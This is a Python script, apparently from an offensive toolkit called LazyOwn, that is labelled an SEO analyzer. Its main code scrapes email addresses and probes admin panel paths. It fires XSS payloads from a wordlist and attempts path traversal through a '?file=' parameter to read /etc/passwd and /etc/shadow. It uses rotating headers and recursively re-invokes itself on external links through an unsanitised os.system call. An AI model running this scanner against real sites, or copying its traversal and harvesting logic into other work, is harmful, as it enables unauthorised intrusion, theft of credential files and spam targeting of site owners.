import sys
import requests
import os
import json
import random
from colors import *
from bs4 import BeautifulSoup
import re
from time import sleep

def make_request(url, retries=3, timeout=30):
    with open('modules/headers.json') as f:
        headers_list = json.load(f)
        
    for attempt in range(retries):
        try:
            headers = random.choice(headers_list)
            print(f"{GREEN}{url=}")
            print(f"{YELLOW}{headers=}")
            response = requests.get(url, headers=headers, timeout=timeout)
            response.raise_for_status()  
            sleep(random.uniform(0.01, 0.1))
            return response
        except requests.Timeout:
            print(f"{YELLOW}Timeout occurred for {url}. Retrying... ({attempt + 1}/{retries})")
        except requests.RequestException as e:
            print(f"{RED}Error fetching {url}: {e}")
            return None
    print(f"{RED}Max retries exceeded for {url}.")
    return None

def analyze_seo(url):
    print(f"{GREEN}URL: {url}")

    seo_data = {}

    response = make_request(url)
    if response is None:
        return
    seo_data['response'] = response.content
    soup = BeautifulSoup(seo_data['response'], 'html.parser')
    title = soup.title.string if soup.title else "No title found"
    print(f"{CYAN}Title: {title}")
    description = soup.find("meta", attrs={"name": "description"})
    description_content = description["content"] if description else "No meta description found"
    print(f"Meta Description: {description_content}")
    h1_tags = soup.find_all('h1')
    h1_contents = [h1.get_text(strip=True) for h1 in h1_tags]
    print(f"H1 Tags: {h1_contents if h1_contents else 'No H1 tags found'}")
    h2_tags = soup.find_all('h2')
    h2_contents = [h2.get_text(strip=True) for h2 in h2_tags]
    print(f"H2 Tags: {h2_contents if h2_contents else 'No H2 tags found'}")
    images = soup.find_all('img')
    images_without_alt = [img['src'] for img in images if not img.get('alt')]
    print(f"Images without alt attributes: {images_without_alt if images_without_alt else 'All images have alt attributes'}")
    internal_links = [link['href'] for link in soup.find_all('a', href=True) if url in link['href']]
    print(f"{BLUE}Internal Links: {internal_links}")
    external_links = [link['href'] for link in soup.find_all('a', href=True) if url not in link['href']]
    print(f"{BLUE}External Links: {external_links}{RESET}")
    js_tags = soup.find_all('script', src=True)
    js_files = [js['src'] for js in js_tags]
    print(f"{MAGENTA}JavaScript Files: {js_files if js_files else 'No JavaScript files found'}")
    form_tags = soup.find_all('form')
    form_actions = [form['action'] for form in form_tags if 'action' in form.attrs]
    print(f"Form Actions: {form_actions if form_actions else 'No forms found'}")
    input_tags = soup.find_all('input')
    inputs = [input.get('name', 'No name attribute') for input in input_tags]
    print(f"Input Fields: {inputs if inputs else 'No input fields found'}")
    file_input_tags = soup.find_all('input', type='file')
    file_inputs = [file_input.get('name', 'No name attribute') for file_input in file_input_tags]
    print(f"{BG_YELLOW}{RED}File Input Fields{RESET}{RED}: {file_inputs if file_inputs else 'No file input fields found'}")
    textarea_tags = soup.find_all('textarea')
    textareas = [textarea.get('name', 'No name attribute') for textarea in textarea_tags]
    print(f"{GREEN}Textareas: {textareas if textareas else 'No textareas found'}")
    select_tags = soup.find_all('select')
    selects = [select.get('name', 'No name attribute') for select in select_tags]
    print(f"Selects: {selects if selects else 'No selects found'}")
    option_tags = soup.find_all('option')
    options = [option.get('value', 'No value attribute') for option in option_tags]
    print(f"Options: {options if options else 'No options found'}")
    text_content = soup.get_text()
    word_count = len(text_content.split())
    print(f"{WHITE}Word Count: {word_count}{RESET}")
    valid_external_links = [link for link in external_links if link and link not in ['#', 'javascript:void(0)', '/', '']]
    pattern = re.compile("[-a-zA-Z0-9._]+@[-a-zA-Z0-9_]+[-a-zA-Z0-9._]+")
    emails = re.findall(pattern, seo_data['response'].decode('utf-8'))
    print(f"{YELLOW}Emails:\033[0m")
    print(emails)

    print("\033[91mWarning: Enter your target address such http://example.com\033[0m")

    start = f"{YELLOW} Start Lazy Scanning...\n"
    for s in start:
        sys.stdout.write(s)
        sys.stdout.flush()
        sleep(0.1)    
    with open("modules/admin_panels.txt", "r") as file:
        for link in file.read().splitlines():
            curl = url + link

            res = make_request(curl)
            if res is None:
                continue
            if res.status_code == 200:
                print("*" * 15)
                print("Admin panel found ==> {}".format(curl))
                print("*" * 15)
            else:
                print("\033[91m Not found ==> {} \033[0m".format(curl))

    start = f"\n{CYAN}  Start Scanning, please wait......\n"
    for s in start:
        sys.stdout.write(s)
        sys.stdout.flush()
        sleep(0.1)    
    vulnerable = []
    with open("modules/XssPayloads.txt", "r") as f:
        for payload in f.read().splitlines():
            link = url + payload
  
            r = make_request(link)
            if r is None:
                continue
            if payload.lower() in r.text.lower():
                print(f"\033[1;31m {GREEN}[-] This site is vulnerable to: \033[0m" + payload)
                if payload not in vulnerable:
                    vulnerable.append(payload)

    print(f"{RED}[-] Available payloads:")
    print("\n".join(vulnerable))

    payloads = {'/etc/passwd': 'root:x', '/etc/shadow': 'root:'}

    dir = '../'
    n = 0
    url = f"{url}/?file="
    for payload, key in payloads.items():
        for n in range(10):
         
            req = make_request(url + (n * dir) + payload)
            if req is None:
                continue
            if key in req.text:
                print('This parameter is vulnerable and attack payload is \033[91m{}'.format((n * dir) + payload) + '\033[0m')
                break    
    for link in valid_external_links:
        new_url = url + "/" + link
        os.system(f"python3 modules/lazyseo.py {new_url}")

if __name__ == "__main__":
    BANNER = f"""{RED}[⚠] Starting 👽 LazyOwn ☠ 530 ☠ [;,;] {RESET}"""
    print(BANNER)
    website_url = sys.argv[1] if len(sys.argv) > 1 else input("   [?] Enter the URL of the website to analyze (including http/https): ")
    try:
        analyze_seo(website_url)
    except KeyboardInterrupt:
        print(f"{RED} Exiting...👽 LazyOwn ☠ 530 ☠ [;,;] {RESET}") 
    